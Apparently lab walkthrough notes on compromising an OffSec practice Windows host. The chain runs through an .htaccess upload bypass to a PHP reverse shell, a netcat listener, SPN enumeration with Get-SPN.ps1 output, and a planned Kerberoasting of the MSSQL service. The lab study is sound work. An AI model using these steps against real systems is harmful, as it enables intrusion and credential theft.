[http://192.168.199.187](#http://192.168.199.187)
\(BUY TICKETS\) -  can upload an image file

server does not allow php files
-  upload revshell\.x \(different format\) \[accepted by server\]

-  echo "AddType application/x\-httpd\-php \.x" \> \.htaccess 
-  upload \.htaccess file

-  upload revshell\.x 

-  nc \-nlvp 4444
-  C:\\xampp\\htdocs\\uploads\>

-  whoami
-  access\\svc\_apache

-  net user
-  Administrator            Guest                    krbtgt                   
svc\_apache               svc\_mssql

-  transfer Get\-SPN\.ps1 to victim machine to get a list of Service Principal Names on machine

-  powershell \(to switch to PS\)
-  \./Get\-SPN\.ps1

Object Name =  SERVER
DN      =       CN=SERVER,OU=Domain Controllers,DC=access,DC=offsec
Object Cat\. =  CN=Computer,CN=Schema,CN=Configuration,DC=access,DC=offsec
servicePrincipalNames
SPN\( 1 \)   =       Dfsr\-12F9A27C\-BF97\-4787\-9364\-D31B6C55EB04/SERVER\.access\.offsec
SPN\( 2 \)   =       ldap/SERVER\.access\.offsec/ForestDnsZones\.access\.offsec
SPN\( 3 \)   =       ldap/SERVER\.access\.offsec/DomainDnsZones\.access\.offsec
SPN\( 4 \)   =       DNS/SERVER\.access\.offsec
SPN\( 5 \)   =       GC/SERVER\.access\.offsec/access\.offsec
SPN\( 6 \)   =       RestrictedKrbHost/SERVER\.access\.offsec
SPN\( 7 \)   =       RestrictedKrbHost/SERVER
SPN\( 8 \)   =       RPC/20dae709\-54fe\-40ec\-8c68\-4475793b542a\.\_msdcs\.access\.offsec
SPN\( 9 \)   =       HOST/SERVER/ACCESS
SPN\( 10 \)   =       HOST/SERVER\.access\.offsec/ACCESS
SPN\( 11 \)   =       HOST/SERVER
SPN\( 12 \)   =       HOST/SERVER\.access\.offsec
SPN\( 13 \)   =       HOST/SERVER\.access\.offsec/access\.offsec
SPN\( 14 \)   =       E3514235\-4B06\-11D1\-AB04\-00C04FC2DCD2/20dae709\-54fe\-40ec\-8c68\-4475793b542a/access\.offsec
SPN\( 15 \)   =       ldap/SERVER/ACCESS
SPN\( 16 \)   =       ldap/20dae709\-54fe\-40ec\-8c68\-4475793b542a\.\_msdcs\.access\.offsec
SPN\( 17 \)   =       ldap/SERVER\.access\.offsec/ACCESS
SPN\( 18 \)   =       ldap/SERVER
SPN\( 19 \)   =       ldap/SERVER\.access\.offsec
SPN\( 20 \)   =       ldap/SERVER\.access\.offsec/access\.offsec

Object Name =  krbtgt
DN      =       CN=krbtgt,CN=Users,DC=access,DC=offsec
Object Cat\. =  CN=Person,CN=Schema,CN=Configuration,DC=access,DC=offsec
servicePrincipalNames
SPN\( 1 \)   =       kadmin/changepw

Object Name =  MSSQL
DN      =       CN=MSSQL,CN=Users,DC=access,DC=offsec
Object Cat\. =  CN=Person,CN=Schema,CN=Configuration,DC=access,DC=offsec
servicePrincipalNames
SPN\( 1 \)   =       MSSQLSvc/DC\.access\.offsec 

-  we nove know SPN of mysql object as “MSSQLSvc/DC\.access\.offsec”\. Now request ticket to get hash from ticket\.

